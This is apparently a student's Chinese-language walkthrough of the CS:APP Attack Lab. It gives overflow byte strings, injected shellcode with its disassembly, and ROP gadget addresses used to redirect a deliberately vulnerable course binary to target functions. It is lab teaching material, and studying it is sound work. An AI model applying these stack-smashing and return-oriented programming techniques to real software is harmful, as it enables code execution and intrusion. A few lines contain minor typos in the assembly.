cookie: 0x 00 00 00 00 59 b9 97 fa

touch1: 0x4017c0

exploit1: 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 c0 17 40 00 00 00 00 00

touch2: 0x4017ec



常用指令

```
./hex2raw < exploit.txt > exploit-raw.txt
run -q < exploit-raw.txt
```

0x7ff95e1f1980

**Phase1-Level2**

getbuf返回时不能返回到test函数，而是要转到touch2函数，level2与level1不同的地方就在于level2不只是单纯的跳转到touch2函数，而是要携带参数cookie一起过去，换句话说在跳转过去之前要先把%rdi的值修改为cookie。

`ret`命令的实际含义是：`pop %rip`，也就是把此时栈中存放的地址弹出作为下一个指令的地址，`%rip`指向的段就会被视作**代码段**来执行，也就是会把`%rip`指向的内存的内容读取为指令来执行。

注入代码inject.s：

```assembly
movq $0x59b997fa, %rdi //把cookie作为参数传给rdi
pushq $0x4017ec		 //把touch2函数的地址压入栈顶
ret					 // pop %rip——把刚刚touch2函数的地址作为下一条指令执行
```

通过`gcc -c `来得到.o文件，再用`objdump -d`来得到指令的机器级表示

```assembly
inject.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```



**Phase_Level3**

touch3: 0x4018fa

让getbuf不会到test，而是回到touch3，并且要把

```assembly
movabs $0x6166373939623935, %rcx
movq %rcx,(%rdi)
movq $0x0, %rcx
movq %rcx, $0x8(%rdi)
pushq $0x4018fa		 //把touch3函数的地址压入栈顶
ret					 // pop %rip——把刚刚touch3函数的地址作为下一条指令执行
```

```assembly
Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 b9 35 39 62 39 39    movabs $0x6166373939623935,%rcx
   7:   37 66 61
   a:   48 89 0f                mov    %rcx,(%rdi)
   d:   48 c7 c1 00 00 00 00    mov    $0x0,%rcx
  14:   48 89 4f 08             mov    %rcx,0x8(%rdi)
  18:   68 fa 18 40 00          pushq  $0x4018fa
  1d:   c3                      retq
```

这种写法不是每一次都能够pass，因为touch3中的s的地址是随机的，我们把数据写在原getbuf栈帧的内存区，在运行touch3和hexmatch函数后，内存区很有可能发生重合，也就是说s有可能重写了我们的数据，在最后匹配的时候就会出错，所以可以将我们的cookie写在test栈帧

我们可以找到test函数的栈顶位置（存放cookie的位置）：

`0x5561dca8`

我们的代码就可以写成：

```assembly
movq $0x5561dca8, %rdi
pushq $0x4018fa
ret
```



### Return-Oriented Programming

与第一部分Injected Code Attack相比，rtarget的代码自身的安全性有提高：

+ 栈地址随机化，每一次运行的栈地址都不同
+ 栈段部分的代码被设置为不可执行，即%rip不能指向栈区，否则会segment fault

![image-20221119211828837](https://raw.githubusercontent.com/linengcs/note-img/main/image-20221119211828837.png)

![image-20221119212529104](https://raw.githubusercontent.com/linengcs/note-img/main/image-20221119212529104.png)



Fortunately, clever people have devised strategies for getting useful things done in a program by executing existing code, rather than injecting new code.The most general form of this is referred to as **return-oriented programming (ROP) .**

![image-20221120000349082](https://raw.githubusercontent.com/linengcs/note-img/main/image-20221120000349082.png)

ROP的攻击理念是，利用现成的由编译器汇编而成的代码，经过重新编排连接成一条gadget链，上图解释了如何把栈设置成一系列可以执行的gadgets，既然栈中不能存放可执行代码，那么我们就把栈当作数据段，其中的数据就可以存放现有的代码段的地址，并通过`ret(pop %rip)`，将代码段的地址赋值给`%rip`，让下一条指令指向目标代码段，从而实现我们的目的。

其中每个gadget都是一系列的指令字节，并且最后一个指令都是`ret(0xc3)`。每一个gadget的最后的`ret`执行后都会跳转到下一个gadget的开始。



**Phase4**

phase4要求我们在rtarget里重新实现phase2，即让getbuf不返回到test，而是返回到touch2，并且将cookie作为参数传递过去，phase2中我们的inject code是：

```assembly
movq $0x59b997fa, %rdi 
pushq $0x4017ec		 
ret					 
```

这部分我们不能直接注入这部分代码，而是要在`start_farm`和`end_farm`两个函数之间的代码中找到能实现我们要求的部分。

对于第一句`movq $0x59b997fa, %rdi `，我们肯定找不到这样有具体常数值的，也就是说我们只能把cookie放进栈里当参数传进寄存器，但是我们也找不到`popq %rdi`，也就只能通过别的寄存器来中转，以`%rax`，这里我们的gadget1就确定了：

```assembly
popq %rax
ret
```

即gadget2应该如下：

```assembly
movq %rax, %rdi
ret
```

注意在gadget2的ret部分就直接跳转到touch2



通过查表，`popq %rax`指令对应的字节序为58，通过查找我们找到

![image-20221120104354644](https://raw.githubusercontent.com/linengcs/note-img/main/image-20221120104354644.png)

位于地址$4019ab开始的字节序：`58 90 c3`符合要求，其中0x90表示`nop`可以忽略

`movq %rax, %rdi`对应的字节序为：`48 89 c67，找到：

![image-20221120104737790](https://raw.githubusercontent.com/linengcs/note-img/main/image-20221120104737790.png)

位于地址$4019c5开始的字节序：`48 89 c7 90 c3`符合要求

即最终的栈结构应该为：

![image-20221120110636389](https://raw.githubusercontent.com/linengcs/note-img/main/image-20221120110636389.png)
